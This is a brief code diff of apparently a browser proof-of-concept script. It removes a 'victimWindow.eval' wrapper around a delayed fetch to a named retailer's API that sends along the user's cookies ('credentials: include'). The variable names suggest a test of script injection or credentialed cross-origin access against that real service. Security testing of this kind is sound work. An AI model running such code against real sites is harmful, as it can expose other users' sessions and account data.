@@ -1,5 +1,4 @@
 setTimeout(() => {
-    victimWindow.eval(`
         fetch('https://api-proxy.eur.halara.com/mall-rest/api/v1/device/startup', {
             method: 'GET',
             credentials: 'include',
@@ -14,5 +13,4 @@ setTimeout(() => {
         .catch(e => {
             alert('Error: ' + e.toString());
         });
-    `);
 }, 2000);
